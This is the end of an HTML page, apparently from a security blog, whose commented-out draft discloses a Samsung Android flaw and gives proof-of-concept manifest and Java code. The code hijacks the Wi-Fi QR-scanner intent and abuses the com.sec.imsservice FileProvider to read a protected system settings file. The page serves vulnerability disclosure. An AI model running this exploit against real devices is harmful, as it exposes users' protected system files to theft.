    <script src="/assets/js/gdprNoticeToggle.js"></script>
    <script src="/assets/anchorjs-4.3.1/anchor.min.js"></script>

    <script>
        const addAnchorsToHeadings = () => {
            anchors.options.visible = 'visible';
            anchors.options.ariaLabel = 'h1';
            anchors.options.placement = 'left';
            anchors.options.icon = '#';
            anchors.options.class = 'anchor-item';
            anchors.add('.heading-anchor');
        }

        addAnchorsToHeadings()
    </script>

<!--todo-->
<!--[comment]: <> ([Output from Oversecured's vulnerability scanner]&#40;#output-from-oversecured’s-vulnerability-scanner&#41;)-->

<!--[comment]: <> ({:.heading-anchor})-->

<!--[comment]: <> (- For SecSettings)-->

<!--[comment]: <> (<img class="post-template__vulnearbility-image" src="/assets/images/SecSettings.png" alt="vulnerability"/>)-->

<!--[comment]: <> (- For an unsafe FileProvider in `com.sec.imsservice`:)-->

<!--[comment]: <> (<img class="post-template__vulnearbility-image" src="/assets/images/imsservice.png" alt="vulnerability"/>)-->

<!--[comment]: <> ([Steps followed to exploit this vulnerability:]&#40;#steps-followed-to-exploit-this-vulnerability&#41;)-->

<!--[comment]: <> ({:.heading-anchor})-->

<!--[comment]: <> (1. The activity `com.android.settings.wifi.WifiDialogActivity` is exported &#40;however, it does request the sender to enable the `android.permission.CHANGE_WIFI_STATE` permission&#41;.)-->

<!--[comment]: <> (2. It launches an implicit intent and passes the activity result to its own `setResult&#40;code, attacker_controlled_intent&#41;`.)-->

<!--[comment]: <> (3. When the victim clicks on "Add network" -> "QR scan" and selects the attacker's app, the app will get read/write access to arbitrary system files.)-->

<!--[comment]: <> (The attack looks like this:)-->

<!--[comment]: <> (1. Launching an activity to add a network)-->

<!--[comment]: <> (File `AndroidManifest.xml`)-->

<!--[comment]: <> (```xml)-->

<!--[comment]: <> (<uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />)-->

<!--[comment]: <> (```)-->

<!--[comment]: <> ({:.code-markdown})-->

<!--[comment]: <> (File `MainActivity.java`)-->

<!--[comment]: <> (```java)-->

<!--[comment]: <> (protected void onCreate&#40;Bundle savedInstanceState&#41; {)-->

<!--[comment]: <> (   super.onCreate&#40;savedInstanceState&#41;;)-->

<!--[comment]: <> (   Intent i = new Intent&#40;&#41;;)-->

<!--[comment]: <> (   i.setClassName&#40;"com.android.settings", "com.android.settings.wifi.WifiDialogActivity"&#41;;)-->

<!--[comment]: <> (   startActivityForResult&#40;i, 0&#41;;)-->

<!--[comment]: <> (})-->

<!--[comment]: <> (protected void onActivityResult&#40;int requestCode, int resultCode, Intent data&#41; {)-->

<!--[comment]: <> (   super.onActivityResult&#40;requestCode, resultCode, data&#41;;)-->

<!--[comment]: <> (   try {)-->

<!--[comment]: <> (       Log.d&#40;"evil", IOUtils.toString&#40;getContentResolver&#40;&#41;.openInputStream&#40;data.getData&#40;&#41;&#41;&#41;&#41;;)-->

<!--[comment]: <> (   } catch &#40;Throwable th&#41; {)-->

<!--[comment]: <> (       throw new RuntimeException&#40;th&#41;;)-->

<!--[comment]: <> (   })-->

<!--[comment]: <> (})-->

<!--[comment]: <> (```)-->

<!--[comment]: <> ({:.code-markdown})-->

<!--[comment]: <> (2. Returning an attacker-controlled intent)-->

<!--[comment]: <> (File `AndroidManifest.xml`)-->

<!--[comment]: <> (```xml)-->

<!--[comment]: <> (<activity android:name=".PickerActivity">)-->

<!--    [comment]: <> (   <intent-filter android:autoVerify="true" android:priority="999">)-->

<!--        [comment]: <> (       <action android:name="android.settings.WIFI_DPP_ENROLLEE_QR_CODE_SCANNER" />)-->

<!--        [comment]: <> (       <category android:name="android.intent.category.DEFAULT" />)-->

<!--        [comment]: <> (   </intent-filter>)-->

<!--    [comment]: <> (</activity>)-->

<!--[comment]: <> (```)-->

<!--[comment]: <> ({:.code-markdown})-->

<!--[comment]: <> (File `PickerActivity.java`)-->

<!--[comment]: <> (```java)-->

<!--[comment]: <> (protected void onCreate&#40;Bundle savedInstanceState&#41; {)-->

<!--[comment]: <> (   super.onCreate&#40;savedInstanceState&#41;;)-->

<!--[comment]: <> (   Intent i = new Intent&#40;"evil"&#41;;)-->

<!--[comment]: <> (   i.setData&#40;Uri.parse&#40;"content://com.sec.internal.ims.rcs.fileprovider/root/data/system/users/0/settings_secure.xml"&#41;&#41;;)-->

<!--[comment]: <> (   i.setFlags&#40;Intent.FLAG_GRANT_READ_URI_PERMISSION&#41;;)-->

<!--[comment]: <> (   setResult&#40;-1, i&#41;;)-->

<!--[comment]: <> (   finish&#40;&#41;;)-->

<!--[comment]: <> (})-->

<!--[comment]: <> (```)-->

<!--[comment]: <> ({:.code-markdown})-->

<!--[comment]: <> (As a result, the content of the file `/data/system/users/0/settings_secure.xml` appeared in the logs.)-->

<!--[comment]: <> ({:.markdown-in-single-quotes})-->
</body>
</html>
